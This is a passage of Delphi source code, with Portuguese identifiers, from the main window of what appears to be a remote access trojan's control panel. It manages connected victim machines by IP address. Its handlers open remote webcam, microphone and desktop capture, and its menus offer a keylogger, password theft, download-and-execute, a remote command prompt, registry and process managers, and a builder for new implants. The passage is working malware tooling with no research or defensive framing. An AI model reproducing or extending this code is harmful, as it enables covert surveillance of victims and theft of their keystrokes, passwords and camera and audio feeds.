  application.ProcessMessages;
  name := LastRenameName;
  if inputquery(pwidechar(traduzidos[169]), pwidechar(traduzidos[171]), name) = false then exit;
  if CheckValidName(Name) = False then Exit;

  LastRenameName := Name;

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      ConAux.EnviarString(RENOMEAR + DelimitadorComandos + Name);
    end;
    Node := MainList.GetNextSelected(Node);
  end;
end;

procedure TFormMain.Restaurar1Click(Sender: TObject);
begin
  TrayIcon1DblClick(nil);
end;

procedure TFormMain.Sair1Click(Sender: TObject);
begin
  ForcarSaida := True;
  Close;
end;

procedure TFormMain.Sair2Click(Sender: TObject);
begin
  ForcarSaida := True;
  Close;
end;

procedure TFormMain.Selecionar1Click(Sender: TObject);
var
  TempSkinName, SkinDir: string;
  x, y: integer;
  resStream: TResourceStream;
begin
  SkinDir := ExtractFilePath(ParamStr(0)) + 'Skins';

  if ForceDirectories(SkinDir) then
  begin
    if FileExists(SkinDir + '\' + 'Garnet.asz') = False then
    begin
      resStream := TResourceStream.Create(hInstance, 'SKIN', 'skinfile');
      resStream.SaveToFile(SkinDir + '\' + 'Garnet.asz');
      resStream.Free;
    end;
  end;

  x := SkinSaturation;
  y := SkinHUE;
  TempSkinName := SkinName;

  if SelectSkin(TempSkinName, SkinDir, x, y) then
  begin
    SkinName := TempSkinName;
    sSkinManager1.SkinDirectory := SkinDir;
    sSkinManager1.SkinName := SkinName;

    SkinSaturation := x;
    SkinHUE := y;
    sSkinManager1.HueOffset := SkinHUE;
    sSkinManager1.Saturation := SkinSaturation;

    if sSkinManager1.Active = False then
    begin
      sSkinManager1.Active := True;

      Application.CreateForm(TFormUpdateSkin, FormUpdateSkin);
      try
        FormUpdateSkin.Show;
        finally
        FormUpdateSkin.Close;
        FormUpdateSkin.Release;
        FormUpdateSkin := nil;
      end;
    end;
  end;
end;

procedure TFormMain.SelectNotifyImage1Click(Sender: TObject);
var
  i, TempInt: integer;
  p: pointer;
  Node: pVirtualNode;
  ConAux: TConexaoNew;
  DirName, TempStr: string;
begin
  DirName := ExtractFilePath(Paramstr(0)) + 'NotifyImages\';
  if ForceDirectories(DirName) = False then exit;

  OpenDialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  OpenDialog1.InitialDir := ExtractFilePath(Paramstr(0));
  OpenDialog1.FileName := 'IMG.jpg';
  OpenDialog1.Filter := 'JPEG Images(*.jpg)|*.jpg';

  if (opendialog1.Execute = true) and (fileexists(opendialog1.FileName) = true) then
  begin

  Node := MainList.GetFirstSelected;
  while Assigned(Node) do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
    if (ConAux <> nil) and (Node.ChildCount <= 0) and (vsSelected in Node.States) then
    begin
      if CopyFile(pwChar(opendialog1.FileName), pwChar(DirName + ConAux.NomeDoServidor + '.jpg'), False) then
      begin
        TempStr := ConAux.NomeDoServidor + DelimitadorComandos + IntToStr(ConAux.ImagemBandeira) + '|' + ConAux.NomeDoServidor + #13#10 + 'IP: ' + ConAux.IPWAN;
        TempInt := Length(TempStr) * 2;
        GetMem(p, TempInt);
        CopyMemory(p, @TempStr[1], TempInt);
        PostMessage(FormMain.Handle, WM_MAININFO, TempInt, integer(p));
        Application.ProcessMessages;
      end;
    end;
    Node := MainList.GetNextSelected(Node);
  end;


  end;
end;

procedure TFormMain.ConvertToHighColor(ImageList: TImageList);
var
  IL: TImageList;
begin
  // Have to create a temporary copy of the given list, because the list is cleared on handle creation.
  IL := TImageList.Create(nil);
  IL.Assign(ImageList);
  with ImageList do
    Handle := ImageList_Create(Width, Height, ILC_COLOR16 or ILC_MASK, Count, AllocBy);
  ImageList.Assign(IL);
  IL.Free;
end;

procedure TFormMain.Copiar1Click(Sender: TObject);
var
  i: integer;
  s: string;
begin
  s := '';
  for I := 0 to ListView1.Items.Count - 1 do
  begin
    if ListView1.Items.Item[i].Selected then
    s := s + ListView1.Items.Item[i].Caption + #13#10;
  end;
  if s <> '' then SetClipboardText(s);
end;

procedure TFormMain.Criarservidor1Click(Sender: TObject);
begin
  Application.CreateForm(TFormCreateServer, FormCreateServer);
  try
	  FormCreateServer.ShowModal;
    finally
    FormCreateServer.Release;
    FormCreateServer := nil;
  end;
end;

procedure TFormMain.ColunaClick(Sender: TObject);
var
  i: integer;
begin
  i := TMenuItem(Sender).Tag;
  if TMenuItem(Sender).Checked then
  begin
    MainList.Header.Columns.Items[i].Options := MainList.Header.Columns.Items[i].Options - [coVisible];
    TMenuItem(Sender).Checked := False;
  end else
  begin
    MainList.Header.Columns.Items[i].Options := MainList.Header.Columns.Items[i].Options + [coVisible];
    TMenuItem(Sender).Checked := True;
  end;
end;

procedure TFormMain.Thumbs1Click(Sender: TObject);
begin
  Thumbs1.Checked := not Thumbs1.Checked;
  ShowThumbPreview := Thumbs1.Checked;

  if Thumbs1.Checked then
  begin
    DesktopImageList.Clear;
    DesktopImageList.Height := ThumbSize;
    DesktopImageList.Width := ThumbSize;
    ChangeImageList(DesktopImageList);
  end else
  begin
    if FlagSize = 0 then
    begin
      if MainList.Images <> Flags16 then ChangeImageList(Flags16);
    end else
    if FlagSize = 1 then
    begin
      if MainList.Images <> Flags24 then ChangeImageList(Flags24);
    end else
    if FlagSize = 2 then
    begin
      if MainList.Images <> Flags32 then ChangeImageList(Flags32);
    end;
  end;
end;

procedure TFormMain.Timer1Timer(Sender: TObject);
var
  ConAux: TConexaoNew;
  i: integer;
  Node: pVirtualNode;
begin
  if EnviandoPING = True then Exit;
  EnviandoPING := True;

  Node := MainList.GetFirst;
  while Assigned(Node) = True do
  begin
    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);

    if (ConAux.Node <> nil)  then
    begin
      ConAux.FontColor := PingColor;
      ConAux.SendPingTime := GetTickCount;
      ConAux.EnviandoString := True;
      try
        ConAux.Connection.IOHandler.WriteLn(PING);
        finally
        ConAux.EnviandoString := False;
      end;

      if (sFrameBar1.Visible) and (ConAux.Node.CheckState = csunCheckedNormal) then
        ConAux.EnviarString(GETDESKTOPPREVIEW + '|' + IntToStr(DesktopSize) + '|');

      if (ShowThumbPreview = true) and (ConAux.Node.CheckState = csunCheckedNormal) then
        ConAux.EnviarString(GETDESKTOPPREVIEWINFO + '|' + IntToStr(ThumbSize) + '|' + IntToStr(ThumbSize) + '|');
    end;

    Node := MainList.GetNext(Node);
  end;

  EnviandoPING := False;
end;

procedure TFormMain.Timer2Timer(Sender: TObject);
var
  NovaJanelaWebcam: TFormWebcam;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
  TempStr: string;
begin

  application.ProcessMessages;

  Node := formmain.MainList.GetFirstVisible;

  while Assigned(Node) do
  begin
    if Node.ChildCount > 0 then
    begin
      Node := formmain.MainList.GetNextVisible(Node);
      Continue;
    end;

    if not (vsVisible in Node.States) then
    begin
      Node := formmain.MainList.GetNextVisible(Node);
      Continue;
    end;

    ConAux := TConexaoNew(pConexaoNew(formmain.MainList.GetNodeData(Node))^);


    if (ConAux.FormWebcam <> nil) then
    begin
      Node := formmain.MainList.GetNextVisible(Node);
      Continue;
    end;

    if (ConAux.FormWebcam <> nil)  then
    begin
    TFormWebcam(ConAux.FormWebcam).Visible:= True;
      if TFormWebcam(ConAux.FormWebcam).Visible then
      begin
        TFormWebcam(ConAux.FormWebcam).BringToFront;
        Node := formmain.MainList.GetNextVisible(Node);
        Continue;
      end;

      TFormWebcam(ConAux.FormWebcam).Caption := traduzidos[479] + ' (' + ConAux.NomeDoServidor + ')';
      TFormWebcam(ConAux.FormWebcam).Show;

    end else
    begin

      NovaJanelaWebcam := TFormWebcam.Create(FormWebcam, ConAux);
      ConAux.FormWebcam := NovaJanelaWebcam;
      TempStr := ConAux.WebcamList;
      if TempStr <> '' then
      begin
        while posex('|', TempStr) > 0 do
        begin
          NovaJanelaWebcam.ComboBox1.Items.Add(Copy(TempStr, 1, posex('|', TempStr) - 1));
          delete(TempStr, 1, posex('|', TempStr));
        end;
        if TempStr <> '' then
        begin
          NovaJanelaWebcam.ComboBox1.Items.Add(TempStr);
          TempStr := '';
        end;
      end else NovaJanelaWebcam.ComboBox1.Items.Add('Default');

      NovaJanelaWebcam.Caption := traduzidos[479] + ' (' + ConAux.NomeDoServidor + ')';
      NovaJanelaWebcam.Show;

    end;
    Node := formmain.MainList.GetNextVisible(Node);
    Application.ProcessMessages;
    if not (TFormWebcam(ConAux.FormWebcam).Visible) then  NovaJanelaWebcam.Show;
  end;
  end;


procedure TFormMain.TrayIcon1BalloonClick(Sender: TObject);
begin
  Restaurar1.Click;
end;

procedure TFormMain.TrayIcon1DblClick(Sender: TObject);
begin
  FormMain.Show;
  ShowWindow(FormMain.Handle, SW_RESTORE);

  SetForegroundWindow(FormMain.Handle);
  FormMain.FormStyle := fsStayOnTop;
  FormStyle := fsNormal;
  TrayIcon1.Visible := False;
end;

procedure TFormMain.Webcam1Click(Sender: TObject);
var
  TempDir: string;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
begin
  if MainList.SelectedCount <= 0 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  TempDir := ExtractFilePath(paramstr(0)) + 'Downloads\' + ConAux.NomeDoServidor + '\WebcamImages';
  ForceDirectories(TempDir);
  ShellExecute(0,
               'open',
               'explorer.exe',
               pWideChar(TempDir),
               '',
               SW_NORMAL);
end;

procedure TFormMain.Capturardesktop1Click(Sender: TObject);
var
  NovaJanelaDesktop: TFormDesktop;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;

  if MainList.SelectedCount <= 0 then Exit;
  Node := MainList.GetFirstSelected;

  while Assigned(Node) do
  begin
    if Node.ChildCount > 0 then
    begin
      Node := MainList.GetNextSelected(Node);
      Continue;
    end;

    if not (vsSelected in Node.States) then
    begin
      Node := MainList.GetNextSelected(Node);
      Continue;
    end;

    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);

    if ConAux.FormDesktop <> nil then
    begin
      if TFormDesktop(ConAux.FormDesktop).Visible then
      begin
        TFormDesktop(ConAux.FormDesktop).BringToFront;
        Node := MainList.GetNextSelected(Node);
        Continue;
      end;

      TFormDesktop(ConAux.FormDesktop).Caption := traduzidos[474] + ' (' + ConAux.NomeDoServidor + ')';
      TFormDesktop(ConAux.FormDesktop).Show;
    end else
    begin
      NovaJanelaDesktop := TFormDesktop.Create(self, ConAux);
      ConAux.FormDesktop := NovaJanelaDesktop;
      NovaJanelaDesktop.Caption := traduzidos[474] + ' (' + ConAux.NomeDoServidor + ')';
      NovaJanelaDesktop.Show;
    end;
    Node := MainList.GetNextSelected(Node);
    Application.ProcessMessages;
  end;
end;

procedure TFormMain.Capturarudio1Click(Sender: TObject);
var
  NovaJanelaAudioCapture: TFormAudioCapture;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
begin
  application.ProcessMessages;

  if MainList.SelectedCount <= 0 then Exit;
  Node := MainList.GetFirstSelected;

  while Assigned(Node) do
  begin
    if Node.ChildCount > 0 then
    begin
      Node := MainList.GetNextSelected(Node);
      Continue;
    end;

    if not (vsSelected in Node.States) then
    begin
      Node := MainList.GetNextSelected(Node);
      Continue;
    end;

    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);

    if ConAux.FormAudioCapture <> nil then
    begin
      if TFormAudioCapture(ConAux.FormAudioCapture).Visible then
      begin
        TFormAudioCapture(ConAux.FormAudioCapture).BringToFront;
        Node := MainList.GetNextSelected(Node);
        Continue;
      end;

      TFormAudioCapture(ConAux.FormAudioCapture).Caption := traduzidos[490] + ' (' + ConAux.NomeDoServidor + ')';
      TFormAudioCapture(ConAux.FormAudioCapture).Show;
    end else
    begin
      NovaJanelaAudioCapture := TFormAudioCapture.Create(self, ConAux);
      ConAux.FormAudioCapture := NovaJanelaAudioCapture;
      NovaJanelaAudioCapture.Caption := traduzidos[490] + ' (' + ConAux.NomeDoServidor + ')';
      NovaJanelaAudioCapture.Show;
    end;

    Node := MainList.GetNextSelected(Node);
    Application.ProcessMessages;
  end;
end;

procedure TFormMain.Capturarwebcam1Click(Sender: TObject);
var
  NovaJanelaWebcam: TFormWebcam;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
  TempStr: string;
begin
  application.ProcessMessages;

  if MainList.SelectedCount <= 0 then Exit;
  Node := MainList.GetFirstSelected;

  while Assigned(Node) do
  begin
    if Node.ChildCount > 0 then
    begin
      Node := MainList.GetNextSelected(Node);
      Continue;
    end;

    if not (vsSelected in Node.States) then
    begin
      Node := MainList.GetNextSelected(Node);
      Continue;
    end;

    ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);

    if ConAux.ImagemCam = 245 then
    begin
      Node := MainList.GetNextSelected(Node);
      Continue;
    end;

    if ConAux.FormWebcam <> nil then
    begin
      if TFormWebcam(ConAux.FormWebcam).Visible then
      begin
        TFormWebcam(ConAux.FormWebcam).BringToFront;
        Node := MainList.GetNextSelected(Node);
        Continue;
      end;

      TFormWebcam(ConAux.FormWebcam).Caption := traduzidos[479] + ' (' + ConAux.NomeDoServidor + ')';
      TFormWebcam(ConAux.FormWebcam).Show;
    end else
    begin
      NovaJanelaWebcam := TFormWebcam.Create(self, ConAux);
      ConAux.FormWebcam := NovaJanelaWebcam;
      TempStr := ConAux.WebcamList;
      if TempStr <> '' then
      begin
        while posex('|', TempStr) > 0 do
        begin
          NovaJanelaWebcam.ComboBox1.Items.Add(Copy(TempStr, 1, posex('|', TempStr) - 1));
          delete(TempStr, 1, posex('|', TempStr));
        end;
        if TempStr <> '' then
        begin
          NovaJanelaWebcam.ComboBox1.Items.Add(TempStr);
          TempStr := '';
        end;
      end else NovaJanelaWebcam.ComboBox1.Items.Add('Default');

      NovaJanelaWebcam.Caption := traduzidos[479] + ' (' + ConAux.NomeDoServidor + ')';
      NovaJanelaWebcam.Show;
    end;
    Node := MainList.GetNextSelected(Node);
    Application.ProcessMessages;
  end;
end;

procedure TFormMain.ChangeImageList(ImageList: TImageList);
var
  Nodes: TNodeArray;
  I: Integer;
  Node: pVirtualNode;
begin
  Node := MainList.GetFirst;
  while Assigned(Node) do
  begin
    pConexaoNew(MainList.GetNodeData(Node))^.ImagemDesktop := -1;
    Node := MainList.GetNext(Node);
  end;
  Nodes := nil;
  MainList.BeginUpdate;
  MainList.Images := ImageList;
  try
    Nodes := GetAllNodes;
    for I := High(Nodes) downto 0 do
    MainList.ReinitNode(Nodes[I], False);
    finally
    begin
      MainList.UpdateScrollBars(true);
      MainList.Repaint;
      MainList.EndUpdate;
    end;
  end;
end;

procedure TFormMain.AbrirCHAT(ConAux: TConexaoNew);
var
  NovaJanelaCHAT: TFormCHAT;
  Node: pVirtualNode;
  i: integer;
  Server, Client, WinTitle: WideString;
begin
  Client := LastChatClient;
  Server := LastChatServer;
  WinTitle := LastWindowTitle;

  try
    FormChatSettings := TFormChatSettings.Create(Application);
    FormChatSettings.Edit1.Text := Server;
    FormChatSettings.Edit2.Text := Client;
    FormChatSettings.Edit3.Text := WinTitle;

    FormChatSettings.Caption := Traduzidos[493];
    FormChatSettings.Label1.caption := traduzidos[494] + ':';
    FormChatSettings.Label3.caption := traduzidos[495] + ':';
    FormChatSettings.Button2.Caption := Traduzidos[120];
    FormChatSettings.Label4.caption := traduzidos[210] + ':';

    if FormChatSettings.ShowModal = mrOK then
    begin
      Server := FormChatSettings.Edit1.Text;
      Client := FormChatSettings.Edit2.Text;
      WinTitle := FormChatSettings.Edit3.Text;
      LastChatClient := Client;
      LastChatServer := Server;
      LastWindowTitle := WinTitle;
    end else
    begin
      Client := '';
      Server := '';
      WinTitle := '';
    end;
    finally
    FormChatSettings.Release;
    FormChatSettings := nil;
  end;

  if (Client = '') or (Server = '') then exit;

  if ConAux.FormCHAT <> nil then
  begin
    if TFormCHAT(ConAux.FormCHAT).Visible then
    begin
      TFormCHAT(ConAux.FormCHAT).BringToFront;
      Exit;
    end;

    TFormCHAT(ConAux.FormCHAT).Caption := traduzidos[493] + ' (' + ConAux.NomeDoServidor + ')';
    TFormCHAT(ConAux.FormChat).MyChatServerName := Server;
    TFormCHAT(ConAux.FormChat).MyChatClientName := Client;
    TFormChat(ConAux.FormChat).MyChatWinTitle := WinTitle;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormCHAT(ConAux.FormCHAT).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormCHAT(ConAux.FormCHAT).Align := alClient;
      TFormCHAT(ConAux.FormCHAT).BorderStyle := bsNone;
    end else
    begin
      TFormCHAT(ConAux.FormCHAT).Parent := nil;
      TFormCHAT(ConAux.FormCHAT).Align := alNone;
      TFormCHAT(ConAux.FormCHAT).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaCHAT := TFormCHAT.Create(self, ConAux, server, client, WinTitle);
    ConAux.FormCHAT := NovaJanelaCHAT;
    NovaJanelaCHAT.Caption := traduzidos[493] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormCHAT(ConAux.FormCHAT).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormCHAT(ConAux.FormCHAT).Align := alClient;
      TFormCHAT(ConAux.FormCHAT).BorderStyle := bsNone;
    end else
    begin
      TFormCHAT(ConAux.FormCHAT).Parent := nil;
      TFormCHAT(ConAux.FormCHAT).Align := alNone;
      TFormCHAT(ConAux.FormCHAT).BorderStyle := bsSizeable;
    end;
  end;
  if ControlCenter then
  begin
    TFormCHAT(ConAux.FormCHAT).Width := TFormAll(ConAux.FormAll).MainPanel.Width;
    TFormCHAT(ConAux.FormCHAT).Height := TFormAll(ConAux.FormAll).MainPanel.Height;
  end;
  TFormCHAT(ConAux.FormCHAT).Caption := traduzidos[493] + ' (' + ConAux.NomeDoServidor + ')';
  TFormCHAT(ConAux.FormCHAT).Show;
end;

procedure TFormMain.CHAT1Click(Sender: TObject);
var
  NovaJanelaCHAT: TFormCHAT;
  ConAux: TConexaoNew;
  Node: pVirtualNode;
  i: integer;
  Server, Client, WinTitle: WideString;
begin
  application.ProcessMessages;
  if MainList.SelectedCount <> 1 then Exit;
  Node := MainList.GetFirstSelected;
  if Node.ChildCount > 0 then Exit;

  ConAux := TConexaoNew(pConexaoNew(MainList.GetNodeData(Node))^);
  AbrirChat(ConAux);
end;

procedure TFormMain.AtualizarIdiomas;
var
  i: integer;
  TempStr: string;
  Node: pVirtualNode;
begin
  MainList.Header.Columns.Items[0].Text := Traduzidos[0];
  MainList.Header.Columns.Items[1].Text := Traduzidos[1];
  MainList.Header.Columns.Items[2].Text := Traduzidos[2];
  MainList.Header.Columns.Items[3].Text := Traduzidos[3];
  MainList.Header.Columns.Items[4].Text := Traduzidos[4];
  MainList.Header.Columns.Items[5].Text := Traduzidos[5];
  MainList.Header.Columns.Items[6].Text := Traduzidos[6];
  MainList.Header.Columns.Items[7].Text := Traduzidos[7];
  MainList.Header.Columns.Items[8].Text := Traduzidos[8];
  MainList.Header.Columns.Items[9].Text := Traduzidos[9];
  MainList.Header.Columns.Items[10].Text := Traduzidos[10];
  MainList.Header.Columns.Items[11].Text := Traduzidos[11];
  MainList.Header.Columns.Items[12].Text := Traduzidos[12];
  MainList.Header.Columns.Items[13].Text := Traduzidos[13];
  MainList.Header.Columns.Items[14].Text := Traduzidos[14];
  MainList.Header.Columns.Items[15].Text := Traduzidos[15];
  MainList.Header.Columns.Items[16].Text := Traduzidos[16];
  MainList.Header.Columns.Items[17].Text := Traduzidos[17];
  MainList.Header.Columns.Items[18].Text := Traduzidos[18];
  ListView1.Column[0].Caption := Traduzidos[583];

  for i := 0 to PopupMenuColumns.Items.Count - 1 do
  begin
    PopupMenuColumns.Items.Items[i].Caption := MainList.Header.Columns.Items[i].Text;
  end;

  Controlcenter1.Caption := Traduzidos[597];
  Arquivo1.Caption := Traduzidos[19];
  Opes1.Caption := Traduzidos[20];
  Idiomas1.Caption := Traduzidos[21];
  Criarservidor1.Caption := Traduzidos[22];
  Sair1.Caption := Traduzidos[23];
  Conexo1.Caption := Traduzidos[24];

  StatusBar1.Panels.Items[0].Text := Traduzidos[13] + ': ' + VersaoDoPrograma;
  StatusBar1.Panels.Items[2].Text := Traduzidos[26] + ': ' + Copy(ExtractFileName(LangFile), 1, posex('.', ExtractFileName(LangFile)) - 1);

  for i := 0 to high(IdTCPServers) do
    if IdTCPServers[i] <> nil then
      TempStr := TempStr + ' [' + inttostr(i) + ']';

  StatusBar1.Panels.Items[3].Text := Traduzidos[27] + ': ' + TempStr;
  if UseUPnP then StatusBar1.Panels.Items[3].Text := StatusBar1.Panels.Items[3].Text + ' (UPnP)';

  Sair2.Caption := Traduzidos[23];
  Restaurar1.Caption := Traduzidos[140];
  Desinstalar1.Caption := traduzidos[141];
  Reconectar1.Caption := traduzidos[165];
  Configuraes1.Caption := traduzidos[151];
  Opesdoservidor1.Caption := traduzidos[167];
  Mudardegrupo1.Caption := traduzidos[168];
  Renomear1.Caption := traduzidos[169];
  Atualizarservidor1.Caption := traduzidos[172];
  Arquivolocal1.Caption := traduzidos[173];
  Configuraesdoservidor1.Caption := traduzidos[531];
  Executarcomandos1.Caption := traduzidos[176];
  Modificarconfiguraes1.Caption := traduzidos[178];
  Baixareexecutar1.Caption := traduzidos[179];
  Abrirpginadainternet1.Caption := traduzidos[181];
  Abrirpastadedownloads1.Caption := traduzidos[183];

  Abrirpastadeimagens1.Caption := traduzidos[567];
  Keylogger2.Caption := traduzidos[637];
  Desktop1.Caption := traduzidos[568];
  Webcam1.Caption := traduzidos[569];

  Enviararquivoseexecutar1.Caption := traduzidos[184];

  Funes1.Caption := traduzidos[510];
  Gerenciadordearquivos1.Caption := traduzidos[388];
  Gerenciadordeprocessos1.Caption := traduzidos[208];
  Gerenciadordejanelas1.Caption := traduzidos[249];
  Gerenciadordeservios1.Caption := traduzidos[279];
  Gerenciadorderegistros1.Caption := traduzidos[303];
  Gerenciadordeclipboard1.Caption := traduzidos[398];
  Programasinstalados1.Caption := traduzidos[419];
  Listardispositivos1.Caption := traduzidos[417];
  Capturardesktop1.Caption := traduzidos[474];
  Capturarwebcam1.Caption := traduzidos[479];
  Capturarudio1.Caption := traduzidos[490];
  Portasativas1.Caption := traduzidos[405];
  Prompt1.Caption := traduzidos[307];
  Diversos1.Caption := traduzidos[427];
  CHAT1.Caption := traduzidos[511];
  Keylogger1.Caption := traduzidos[499];
  Passwords1.Caption := traduzidos[521];
  Procurarpalavrasnokeylogger1.Caption := traduzidos[522];
  Procurararquivos1.Caption := traduzidos[321];
  Iniciar1.Caption := traduzidos[328];
  Parar1.Caption := traduzidos[329];
  MSN1.Caption := traduzidos[534];

  Reiniciar1.Caption := traduzidos[448];
  Desativar1.Caption := traduzidos[562];
  AtualizaodeIP1.Caption := traduzidos[577];

  Habilitar1.Caption := traduzidos[650];
  Selecionar1.Caption := traduzidos[651];
  SelectNotifyImage1.Caption := traduzidos[652];

  Node := MainList.GetFirst;
  while Assigned(Node) do
  begin
    if pConexaoNew(MainList.GetNodeData(Node))^.ImagemCam = 244 then pConexaoNew(MainList.GetNodeData(Node))^.CAM := Traduzidos[95] else
    pConexaoNew(MainList.GetNodeData(Node))^.CAM := Traduzidos[96];
    Node := MainList.GetNext(Node);
  end;

  Contatos1.Caption := traduzidos[605];
  Copiar1.Caption := traduzidos[606];
  JanelasAlwasOnTop1.Caption := traduzidos[620];
  Registrosdeconexes1.Caption := traduzidos[646];
  Baixarlogsdokeylogger1.Caption := traduzidos[649];
  AtualizarQuantidade;
  MainList.Refresh;
end;

procedure TFormMain.showFrameBar(AVisible: boolean);
begin
  SendMessage(Self.Handle, WM_SETREDRAW, 0, 0);                    // Antiblinking
  sFrameBar1.Left := BarSpeedButton.Left;                          // FrameBar must be left always
  BarSpeedButton.Visible := not (AVisible and AutoHidingEnabled);
  sFrameBar1.Visible := AVisible;
  if BarSpeedButton.Visible then begin
    if AVisible then begin
      BarSpeedButton.Caption := sCloseBar;
    end
    else begin
      BarSpeedButton.Caption := sOpenBar;
    end;
{    if AutoHidingEnabled
      then BarSpeedButton.SkinData.SkinSection := s_PanelLow
      else BarSpeedButton.SkinData.SkinSection := s_SpeedButton;}
  end;
  SendMessage(Self.Handle, WM_SETREDRAW, 1, 0);
  RedrawWindow(Self.Handle, nil, 0, RDW_ALLCHILDREN or RDW_ERASE or RDW_INVALIDATE);
end;

procedure TFormMain.Splitter1Moved(Sender: TObject);
var
  d: single;
begin
  if Image1.Picture = nil then Exit;
  if Image1.Picture.Bitmap.Width <= 0 then Exit;
  if Image1.Picture.Bitmap.Height <= 0 then Exit;

  d := Image1.Picture.Bitmap.Height / Image1.Picture.Bitmap.Width;
  Image1.Height := round(d * Image1.Width);
end;

procedure TFormMain.StatusBar1Click(Sender: TObject);
begin
  if StatusBar1.Cursor = CrHandPoint then
  begin
    Conexo1Click(nil);
  end;
end;

procedure TFormMain.StatusBar1MouseLeave(Sender: TObject);
begin
  StatusBar1.Cursor := CrDefault;
end;

procedure TFormMain.StatusBar1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  if (X >= StatusBar1.Panels.Items[0].Width +
           StatusBar1.Panels.Items[1].Width +
           StatusBar1.Panels.Items[2].Width) and
     (Y > 0) and (Y < StatusBar1.Height) then
  begin
    StatusBar1.Cursor := CrHandPoint;
  end else StatusBar1.Cursor := CrDefault;
end;

procedure TFormMain.IdiomaClick(Sender: TObject);
var
  MI: TMenuItem;
  i: integer;
  IniFile: TIniFile;
begin
  MI := TMenuItem(sender);
  if MI.Checked then Exit;

  if FileExists(IdiomasFilesDir + MI.Hint + '.ini') then
  begin
    LangFile := IdiomasFilesDir + MI.Hint + '.ini';
    StatusBar1.Panels.Items[2].Text := Traduzidos[26] + ': ' + Copy(ExtractFileName(LangFile), 1, posex('.', ExtractFileName(LangFile)) - 1);

    for I := 0 to Idiomas1.Count - 1 do
    begin
      Idiomas1.Items[i].Checked := False;
      if IdiomasFilesDir + Idiomas1.Items[i].Hint + '.ini' = LangFile then
      Idiomas1.Items[i].Checked := True;
    end;

    IniFile := TIniFile.Create(LangFile);
    for i := 0 to high(Traduzidos) do
      traduzidos[i] := UTF8ToAnsi(IniFile.ReadString('lang', inttostr(i), ''));
    IniFile.Free;

    AtualizarIdiomas;

    for i := 1 to Screen.FormCount - 1 do
    PostMessage(Screen.Forms[i].Handle, WM_ATUALIZARIDIOMA, 0, 0);

  end else
  begin
    MessageBox(Handle, pchar(IdiomasFilesDir + MI.Hint + #13#10 + Traduzidos[28]), pchar(NomeDoPrograma + ' ' + VersaoDoPrograma), MB_OK + MB_ICONERROR);
    IdiomasListFileDir(IdiomasFilesDir);
  end;
end;

procedure TFormMain.IdiomasListFileDir(Path: string);
var
  SR: TSearchRec;
  MI, MIsub: TMenuItem;
  S: string;
begin
  ForceDirectories(Path);
  MI := Idiomas1;
  MI.Clear;
  if FindFirst(Path + '*.ini', faAnyFile, SR) = 0 then
  begin
    repeat
      if (SR.Attr <> faDirectory) then
      begin
        if posex('.', SR.Name) > 0 then
        begin
          MISub := TMenuItem.Create(nil);
          MI.Insert(MI.Count, MISub);
          S := Copy(SR.Name, 1, LastDelimiter('.', SR.Name) - 1);
          MISub.Caption := S;
          MISub.Hint := S;
          MISub.OnClick := IdiomaClick;
          if Path + SR.Name = LangFile then MISub.Checked := True;
        end;
      end;
    until FindNext(SR) <> 0;
    FindClose(SR);
  end;
end;

procedure TFormMain.AbrirFileManager(ConAux: TConexaoNew);
var
  NovaJanelaFileManager: TFormFileManager;
  Node: pVirtualNode;
  i: integer;
begin
  if ConAux.FormFileManager <> nil then
  begin
    if TFormFileManager(ConAux.FormFileManager).Visible then
    begin
      TFormFileManager(ConAux.FormFileManager).BringToFront;
      Exit;
    end;

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
    begin
      if TFormAll(ConAux.FormAll).Visible then
      begin
        TFormAll(ConAux.FormAll).BringToFront;
      end else
      begin
        TFormAll(ConAux.FormAll).Caption := traduzidos[597] + ' (' + ConAux.NomeDoServidor + ')';
        TFormAll(ConAux.FormAll).Show;
      end;

      TFormFileManager(ConAux.FormFileManager).Parent := TFormAll(ConAux.FormAll).MainPanel;
      TFormFileManager(ConAux.FormFileManager).Align := alClient;
      TFormFileManager(ConAux.FormFileManager).BorderStyle := bsNone;
    end else
    begin
      TFormFileManager(ConAux.FormFileManager).Parent := nil;
      TFormFileManager(ConAux.FormFileManager).Align := alNone;
      TFormFileManager(ConAux.FormFileManager).BorderStyle := bsSizeable;
    end;
  end else
  begin
    NovaJanelaFileManager := TFormFileManager.Create(self, ConAux);
    ConAux.FormFileManager := NovaJanelaFileManager;
    NovaJanelaFileManager.Caption := traduzidos[388] + ' (' + ConAux.NomeDoServidor + ')';

    if (ControlCenter = True) and (ConAux.FormAll <> nil) then
